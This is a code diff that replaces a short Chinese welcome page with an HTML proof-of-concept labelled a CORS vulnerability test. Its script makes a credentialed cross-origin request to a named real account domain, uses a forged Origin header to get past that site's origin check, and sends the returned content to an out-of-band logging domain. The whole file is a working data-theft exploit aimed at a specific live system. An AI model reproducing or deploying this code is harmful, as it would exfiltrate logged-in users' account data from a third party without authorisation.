@@ -1,1 +1,36 @@
-<h1>欢迎光临 出入平安</h1>
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>CORS漏洞测试</h1>
+    <script>
+        // 1. 替换成你的临时域名（比如从 dnslog.cn 或 interactsh 拿到的，例如：abc123.dnslog.cn）
+        const logDomain = "d1o7j04gtqkrmel3f0jg4cfd6re4fraus.oast.me"; 
+
+        // 2. 目标网站的接口（先试试根目录，后面可以换其他接口）
+        const targetUrl = "https://account.uds-sit.lenovo.com";
+
+        // 发送跨域请求
+        fetch(targetUrl, {
+            method: "GET",
+            credentials: "include", // 关键：携带Cookie等登录信息
+            headers: {
+                // 3. 构造恶意Origin，利用漏洞里显示的规则
+                "Origin": "https://account.uds-sit.lenovo.com_.sgq4x.com"
+            }
+        })
+        .then(response => {
+            // 打印响应状态（成功/失败）
+            console.log("请求结果：", response.status);
+            return response.text(); // 读取响应内容
+        })
+        .then(data => {
+            // 把获取到的数据发送到你的临时域名（方便查看结果）
+            fetch(`https://${logDomain}?result=${encodeURIComponent(data)}`);
+            console.log("服务器返回的内容：", data);
+        })
+        .catch(error => {
+            console.log("跨域请求被阻止：", error);
+        });
+    </script>
+</body>
+</html>
